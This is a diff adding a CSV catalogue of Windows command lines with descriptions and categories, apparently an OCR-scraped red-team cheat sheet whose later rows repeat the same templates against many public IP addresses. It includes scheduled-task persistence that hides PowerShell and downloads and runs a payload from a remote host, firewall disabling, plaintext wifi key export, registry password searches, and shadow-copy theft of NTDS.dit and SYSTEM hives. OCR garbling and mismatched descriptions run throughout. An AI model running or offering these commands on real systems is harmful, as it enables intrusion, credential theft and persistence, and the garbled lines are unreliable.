@@ -1,0 +1,272 @@
+Exename,commandline,description,category
+arp.exe,arp -a,Known MACs (ARP table I,NETWORK INFO
+at.exe,"at \\10.0.0.100 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+at.exe,"at \\10.0.0.100 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+dir.exe,dir /a /b c:\windows\kb,Search for patches,WINDOWS SYSTEMINFO
+dir.exe,dir /a /s /b c:\ .pdf,Search for all PDFs,WINDOWS SYSTEMINFO
+dsquery.exe,"dsquery ' domainroot -filter "" (& (objectCategory=Computer) (objectClass=Computer) (operatingSystem=Server' ) ) "" -limit 0 ",FXND SERVERS XN THE DOMAIN ,DOMAIN ENUMERATION
+dsquery.exe,"dsquery group -name ""domain admins"" | dsget group -members -expand ",LIST DOMAIN ADMIN ACCOUNTS ,DOMAIN ENUMERATION
+dsquery.exe,dsquery user -inactive 2 ,LIST ACCOUNTS INACTIVE FOR 2 WEEKS ,DOMAIN ENUMERATION
+dsquery.exe,dsquery user -limit 0 ,LIST USERS ON DOMAIN WITH NO LIMIT ON RESULTS ,DOMAIN ENUMERATION
+dsquery.exe,dsquery user -name bob | dsget user -samid ,GET A USER'S LOGIN ID ,DOMAIN ENUMERATION
+dsquery.exe,dsquery user -name bob I dsget user -memberof -expand ,LIST ALL GROUPS FOR A USER ,DOMAIN ENUMERATION
+echo.exe,echo %USERNAME%,Current user ,WINDOWS SYSTEMINFO
+findstr.exe,findstr /si password .txt |.xml|.xls,Search files for password,WINDOWS SYSTEMINFO
+fsutil.exe,fsutil fsinfo drives ,List drives �must be admin,WINDOWS SYSTEMINFO
+powershell.exe,Get-Childitem -Path c:\ -Force -Recurse -Filter '.log -ErrorAction SilentlyContinue I where {$ .LastWriteTime -gt ''2012-08-20''},RETUm FILES WITH WRITE DATE PAST 8/2 0 ,POWERSHELL 
+powershell.exe,Get-Service I where object {$ .status -eq ''Running''} ,LIST RUNNING SERVICES ,POWERSHELL 
+powershell.exe,Get-WmiObject -class win32 operatingsjstem| select -property  * | export-csv c:\os.txt,Export OS Info to csv files,POWERSHELL 
+powershell.exe,"Get-WmiObject -Computemame DC -Namespace root\microsoftDNS -Class MicrosoftDNS _ ResourceRecord -Filter ""domainname~' DOMAIN '"" I select textrepresentation ",LIST HOSTNAME AND IP FOR ALL DOMAIN COMPUTERS ,POWERSHELL 
+ipconfig.exe,ipconfig /all,IP configuration,NETWORK INFO
+ipconfig.exe,ipconfig /displaydns,Local DNS cache,NETWORK INFO
+net.exe,net accounts /domain,Domain password policy,NET COMMANDS 
+net.exe,"net group ""Domain Admins"" /domain",List users in Domain Admins,NET COMMANDS 
+net.exe,"net group ""Domain Controllers"" /domain",List DCs for current domain,NET COMMANDS 
+net.exe,net group /domain,List domain groups,NET COMMANDS 
+net.exe,"net localgroup ""Administrators""",List local Admins,NET COMMANDS 
+net.exe,"net localgroup ""Administrators"" user /add",Add user to Administrators,NET COMMANDS 
+net.exe,"net session I find I ""\\""",Active SHB sessions,NET COMMANDS 
+net.exe,net share,Current SMB shares,NET COMMANDS 
+net.exe,net share \\ 10.0.0.100,Shares of remote computer,WINDOWS REMOTING
+net.exe,net share share c:\share,Share folder,NET COMMANDS 
+net.exe,net time \\10.0.0.100,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 10.0.0.100,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net use z: \\ 10.0.0.100 \share password,Map drive specified,WINDOWS REMOTING
+net.exe,net user /domain,All users in current domain,NET COMMANDS 
+net.exe,net user user '' newpassword '' /domain,Change domain user password,NET COMMANDS 
+net.exe,net user user /ACTIVE:jes /domain,Unlock domain user account,NET COMMANDS 
+net.exe,net user user pass /add,Add user,NET COMMANDS 
+net.exe,net view /domain,Hosts in current domain,NET COMMANDS 
+net.exe,net view /domain:,Hosts in,NET COMMANDS 
+netsh.exe,netsh advfirewall set allprofiles state off,disable windows firewall,MISC. COMMANDS 
+netsh.exe,netsh advfirewall set currentprofile state off,disable windows firewall,MISC. COMMANDS 
+netsh.exe,netsh firewall set opmode disable,Disable firewall ('Old),NETWORK INFO
+netsh.exe,netsh firewall set service type = remotedesktop mode = enable,disable network level authentication - add firewall exception,TERMINAL SERVICES (RDP) 
+netsh.exe,netsh interface 10.0.0.100 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
+netsh.exe,netsh interface 10.0.0.100 show interfaces,List interface IDs/MTUs,NETWORK INFO
+netsh.exe,netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1 ,remove port forwarding,MISC. COMMANDS 
+netsh.exe,netsh wlan export profile folder=. key=clear,Export wifi plaintext pwd,NETWORK INFO
+netsh.exe,netsh wlan show profiles,Saved wireless profiles,NETWORK INFO
+netstat.exe,netstat -ana,Open connections,NETWORK INFO
+netstat.exe,netstat -ani findstr LISTENING,LISTENING ports,NETWORK INFO
+netstat.exe,netstat -anop tcp 1,Netstat loop,NETWORK INFO
+powershell.exe,New-PSJrive -Persist -PSProvider FileSjstem -Root \\1.1.1.1\tools -Name i ,PERSISTENT PSDRIVE TO REMOTE FILE SHARE,POWERSHELL 
+nslookup.exe,nslookup -type=SRV _www._tcp.url.com,Domain SRV lookup ( ldapkerberossip),NETWORK INFO
+powershell.exe,"powershell -noprofile -noninteractive -noexit -command ""& {$cmd=type 'c:\windows\temp\ shell.txt'; powershell -noprofilenoninteractive -noexit -encodedCommand $cmd}""",Execute shellcode,POWERSHELL 
+powershell.exe,"powershell. exe -Command ""do {if ((Get-Date -format yyyyMMdd-HHmm) -match '201308 ( 0[8-9]|1[0-1])-(0[8-9]|1[0-7]) [0-5] [0-9]') {Start-Process -WindowStyle Hidden ""C:\Temp\my.exe"";Start-Sleep -s 14400}}while(1)"" ",RUN EXE EVERY 4 HOURS BETWEEN AUG 8-11  2 013 AND THE HOURS OF 0800-1700 (FROM CMo. EXE) ,POWERSHELL 
+powershell.exe,"powershell.exe SendMailMessage -to "" email "" -from "" email "" -subject ""Subject"" -a "" attachment file path "" -body ""Body"" -SmtpServer 10.0.0.25",EMAIL SENDER ,POWERSHELL 
+psexec.exe,psexec /accepteula \\ 10.0.0.100 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 10.0.0.100 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 10.0.0.100 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+reg.exe,"reg add ""Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Start RDP,TERMINAL SERVICES (RDP) 
+reg.exe,"reg add ""HKEY LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server\WinStations\RDP-TCP"" /v UserAuthentication /t REG_DWORD /d ""0"" /f",disable network level authentication - add firewall exception,TERMINAL SERVICES (RDP) 
+reg.exe,"REG ADD ""HKLM\System\CurrentControlSet\Control \Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d 443 /f",Tunnel RDP,TERMINAL SERVICES (RDP) 
+reg.exe,reg add \\ 10.0.0.100 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+reg.exe,reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG DWORD /d 0 /f,re-enable command prompt,MISC. COMMANDS 
+reg.exe,reg query HKLM /f password /t REG SZ /s,Search registrj for password,WINDOWS SYSTEMINFO
+reg.exe,reg query\\ 10.0.0.100 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
+reg.exe,reg save security.hive,Save securitj hive to file,WINDOWS SYSTEMINFO
+route.exe,route print,Routing table,NETWORK INFO
+sc.exe,sc \\ 10.0.0.100 create service,Create a remote service,WINDOWS REMOTING
+sc.exe,sc query state=all,Show services,WINDOWS SYSTEMINFO
+schtasks.exe,"SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST MM/DD/YYYY /ED l1M/DD/YYYY /tr ""C:\my.exe"" /RU password ",RUN EXE EVERY 4 HOURS BETWEEN AUG 8-11  2 013 AND THE HOURS OF 0800-1700 (FROM CMo. EXE) ,TASK SCHEDULER 
+schtasks.exe,"SCHTASKS /CREATE /TN Task Name /TR ""C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStjle hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object net.webclient) .downloadstring(''http:// 100.100.100.100 : port / payload'''))'"" /SC onstart /RU System ",TASK SCHEDULER PERSISTENCE  (x86) on System Start ,TASK SCHEDULER 
+schtasks.exe,"SCHTASKS /CREATE /TN Task Name /TR ""C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle hidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object net.webclient) .downloadstring(''http:// 100.100.100.100 : port / payload'''))'"" /SC onidle /i 30 ",TASK SCHEDULER PERSISTENCE  (x86) on User Idle (30 Minutes),TASK SCHEDULER 
+schtasks.exe,"SCHTASKS /CREATE /TN Task Name /TR ""C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object net.webclient) .downloadstring( ''http:// 100.100.100.100 : port / payload'''))'"" /SC onlogon /RU System ",TASK SCHEDULER PERSISTENCE  (x86) on User Login,TASK SCHEDULER 
+schtasks.exe,"schtasks.exe /create /tn MyTask /xml ""C:\MyTask.xml"" /f ",Import a scheduled task from an exported task XML ,WMIC COMMANDS
+shutdown.exe,shutdown /m \\ 10.0.0.100 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 10.0.0.100 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
+systeminfo.exe,systeminfo /S 10.0.0.100 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+taskkill.exe,taskkill /PID pid /F,Force process to terminate,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /m,Show all processes & DLLs,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 10.0.0.100 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 10.0.0.100 /v,Remote process listing,WINDOWS REMOTING
+tasklist.exe,tasklist /svc,Show processes & services,WINDOWS SYSTEMINFO
+tftp.exe,tftp -I 10.0.0.100 GET remotefile,TFTP file transfer,NETWORK INFO
+tree.exe,tree /F /A c:\ tree.txt,Directory listing of C:,WINDOWS SYSTEMINFO
+ver.exe,ver,Get OS version,WINDOWS SYSTEMINFO
+wmic.exe,"wmic /node: DC 10.0.0.101 /user: "" D0MAIN\user"" /password: "" PASS "" process call create ""cmd /c vssadmin create shadow /for=C: 2 &1 C:\temp\output.txt""",Volumn shadow copy exfil,WMIC COMMANDS
+wmic.exe,"wmic /node: DC 10.0.0.101 /user: "" DOMAIN\user"" /password:""PASS"" process call create ""cmd /c \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive 2 &1 C:\temp\output.txt""",Volumn shadow copy exfil,WMIC COMMANDS
+wmic.exe,"wmic /node: DC 10.0.0.101 /user: ""DOMAIN\user"" /password: "" PASS"" process call create ''cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyc\NTDS\NTDS.dit C:\temp\ntds.dit 2 &1 C:\temp\output.txt"" ",Volumn shadow copy exfil,WMIC COMMANDS
+wmic.exe,"wmic /node: DC 10.0.0.101 /user:""DOMAIN\user"" /password:""PASS "" process call create ""cmd /c vssadmin list shadows 2 &1 c:\temp\output.txt""",Volumn shadow copy exfil,WMIC COMMANDS
+wmic.exe,"wmic /node: 10.0.0.100 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+wmic.exe,"wmic /node:""machinename 4"" path Win32_TerminalServiceSetting where AllowTSConnections=''O'' call SetAllowTSConnections ''1''",Remotely start RDP,WMIC COMMANDS
+wmic.exe,wmic /node:machinename process list brief /every:l,remote process listing every second,WMIC COMMANDS
+wmic.exe,wmic /node:remotecomputer computersystem get usemame,REMOTELY DETERMINE LOGGED IN USER,WMIC COMMANDS
+wmic.exe,wmic [alias] call /?,Callable methods,WMIC COMMANDS
+wmic.exe,wmic [alias] get /?,List all attributes,WMIC COMMANDS
+wmic.exe,wmic cpu get DataWidth /format:list,Display 32 I I 64 bit ,WMIC COMMANDS
+wmic.exe,"wmic netlogin where (name like ""%adm%"") get numberoflogons",list number of times user has logged in,WMIC COMMANDS
+wmic.exe,wmic ntdomain list,Domain and DC info,WMIC COMMANDS
+wmic.exe,"wmic process call create ""process name""",Execute process,WMIC COMMANDS
+wmic.exe,wmic process list full,Process attributes,WMIC COMMANDS
+wmic.exe,"wmic process where name=""process"" call terminate",Terminate process,WMIC COMMANDS
+wmic.exe,wmic product get name /value # Get software names,Get software names,WMIC COMMANDS
+wmic.exe,"wmic product where name=""XXX"" call uninstall /nointeractive ",uninstall software names via wmic,WMIC COMMANDS
+wmic.exe,wmic qfe,List all patches,WMIC COMMANDS
+wmic.exe,wmic startupwmic service,Starts wmic service,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 10.0.0.100 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+at.exe,"at \\76.76.163.112 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+at.exe,"at \\76.76.163.112 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+psexec.exe,psexec /accepteula \\ 76.76.163.112 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 76.76.163.112 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 76.76.163.112 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+reg.exe,reg add \\ 64.119.205.26 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+wmic.exe,"wmic /node: 64.119.205.26 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 64.119.205.26 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+net.exe,net time \\190.197.26.39,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 190.197.26.39,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net use z: \\ 190.197.26.39 \share password,Map drive specified,WINDOWS REMOTING
+netsh.exe,netsh interface 190.197.26.39 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
+netsh.exe,netsh interface 190.197.26.39 show interfaces,List interface IDs/MTUs,NETWORK INFO
+psexec.exe,psexec /accepteula \\ 190.197.26.39 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 190.197.26.39 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 190.197.26.39 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+tasklist.exe,tasklist /S 61.6.206.57 /v,Remote process listing,WINDOWS REMOTING
+tftp.exe,tftp -I 61.6.206.57 GET remotefile,TFTP file transfer,NETWORK INFO
+wmic.exe,"wmic /node: 61.6.206.57 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 61.6.206.57 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+net.exe,net time \\154.66.173.171,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 154.66.173.171,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net use z: \\ 154.66.173.171 \share password,Map drive specified,WINDOWS REMOTING
+netsh.exe,netsh interface 154.66.173.171 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
+psexec.exe,psexec /accepteula \\ 154.66.173.171 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+reg.exe,reg add \\ 208.168.243.90 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 208.168.243.90 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+tasklist.exe,tasklist /S 208.168.243.90 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 208.168.243.90 /v,Remote process listing,WINDOWS REMOTING
+xcopy.exe,xcopy /s \\ 208.168.243.90 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+at.exe,"at \\81.248.22.100 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+at.exe,"at \\81.248.22.100 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net share \\ 81.248.22.100,Shares of remote computer,WINDOWS REMOTING
+net.exe,net time \\81.248.22.100,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 81.248.22.100,Remote filesystem (IPC$),WINDOWS REMOTING
+psexec.exe,psexec /accepteula \\ 81.248.22.100 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+reg.exe,reg add \\ 81.248.37.11 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+reg.exe,reg query\\ 81.248.37.11 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
+sc.exe,sc \\ 81.248.37.11 create service,Create a remote service,WINDOWS REMOTING
+shutdown.exe,shutdown /m \\ 81.248.37.11 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 81.248.37.11 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
+systeminfo.exe,systeminfo /S 81.248.37.11 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+tasklist.exe,tasklist /S 81.248.37.11 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 81.248.37.11 /v,Remote process listing,WINDOWS REMOTING
+tftp.exe,tftp -I 81.248.37.11 GET remotefile,TFTP file transfer,NETWORK INFO
+net.exe,net use \\ 72.27.160.60,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net use z: \\ 72.27.160.60 \share password,Map drive specified,WINDOWS REMOTING
+netsh.exe,netsh interface 72.27.160.60 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
+netsh.exe,netsh interface 72.27.160.60 show interfaces,List interface IDs/MTUs,NETWORK INFO
+psexec.exe,psexec /accepteula \\ 127.0.0.1 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 127.0.0.1 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 127.0.0.1 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+reg.exe,reg add \\ 208.91.197.27 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+reg.exe,reg query\\ 208.91.197.27 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
+sc.exe,sc \\ 208.91.197.27 create service,Create a remote service,WINDOWS REMOTING
+shutdown.exe,shutdown /m \\ 208.91.197.27 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 208.91.197.27 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
+systeminfo.exe,systeminfo /S 208.91.197.27 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+tasklist.exe,tasklist /S 208.91.197.27 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 208.91.197.27 /v,Remote process listing,WINDOWS REMOTING
+tftp.exe,tftp -I 208.91.197.27 GET remotefile,TFTP file transfer,NETWORK INFO
+wmic.exe,"wmic /node: 208.91.197.27 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 208.91.197.27 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+at.exe,"at \\52.175.39.99 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+at.exe,"at \\52.175.39.99 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net share \\ 52.175.39.99,Shares of remote computer,WINDOWS REMOTING
+net.exe,net time \\52.175.39.99,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 52.175.39.99,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net use z: \\ 52.175.39.99 \share password,Map drive specified,WINDOWS REMOTING
+netsh.exe,netsh interface 52.175.39.99 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
+netsh.exe,netsh interface 52.175.39.99 show interfaces,List interface IDs/MTUs,NETWORK INFO
+psexec.exe,psexec /accepteula \\ 52.175.39.99 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 52.175.39.99 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 52.175.39.99 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+reg.exe,reg add \\ 40.112.64.87 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+reg.exe,reg query\\ 40.112.64.87 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
+sc.exe,sc \\ 40.112.64.87 create service,Create a remote service,WINDOWS REMOTING
+shutdown.exe,shutdown /m \\ 40.112.64.87 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 40.112.64.87 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
+systeminfo.exe,systeminfo /S 40.112.64.87 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+tasklist.exe,tasklist /S 40.112.64.87 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 40.112.64.87 /v,Remote process listing,WINDOWS REMOTING
+tftp.exe,tftp -I 40.112.64.87 GET remotefile,TFTP file transfer,NETWORK INFO
+wmic.exe,"wmic /node: 40.112.64.87 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 40.112.64.87 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+at.exe,"at \\13.81.218.185 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+at.exe,"at \\13.81.218.185 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net share \\ 13.81.218.185,Shares of remote computer,WINDOWS REMOTING
+net.exe,net time \\13.81.218.185,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 13.81.218.185,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net use z: \\ 13.81.218.185 \share password,Map drive specified,WINDOWS REMOTING
+netsh.exe,netsh interface 13.81.218.185 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
+netsh.exe,netsh interface 13.81.218.185 show interfaces,List interface IDs/MTUs,NETWORK INFO
+psexec.exe,psexec /accepteula \\ 13.81.218.185 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 13.81.218.185 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 13.81.218.185 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+reg.exe,reg add \\ 13.81.218.185 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+reg.exe,reg query\\ 13.81.218.185 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
+sc.exe,sc \\ 13.81.218.185 create service,Create a remote service,WINDOWS REMOTING
+shutdown.exe,shutdown /m \\ 13.81.218.185 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 13.81.218.185 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
+systeminfo.exe,systeminfo /S 13.81.218.185 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+tasklist.exe,tasklist /S 13.81.218.185 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 13.81.218.185 /v,Remote process listing,WINDOWS REMOTING
+tftp.exe,tftp -I 13.81.218.185 GET remotefile,TFTP file transfer,NETWORK INFO
+wmic.exe,"wmic /node: 13.81.218.185 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 13.81.218.185 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+at.exe,"at \\104.210.48.12 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+at.exe,"at \\104.210.48.12 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net share \\ 104.210.48.12,Shares of remote computer,WINDOWS REMOTING
+net.exe,net time \\104.210.48.12,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 104.210.48.12,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net use z: \\ 104.210.48.12 \share password,Map drive specified,WINDOWS REMOTING
+netsh.exe,netsh interface 104.210.48.12 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
+netsh.exe,netsh interface 104.210.48.12 show interfaces,List interface IDs/MTUs,NETWORK INFO
+psexec.exe,psexec /accepteula \\ 104.210.48.12 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 104.210.48.12 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 104.210.48.12 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
+reg.exe,reg add \\ 104.210.48.12 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+reg.exe,reg query\\ 104.210.48.12 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
+sc.exe,sc \\ 104.210.48.12 create service,Create a remote service,WINDOWS REMOTING
+shutdown.exe,shutdown /m \\ 104.210.48.12 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 104.210.48.12 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
+systeminfo.exe,systeminfo /S 104.210.48.12 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+tasklist.exe,tasklist /S 104.210.48.12 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 104.210.48.12 /v,Remote process listing,WINDOWS REMOTING
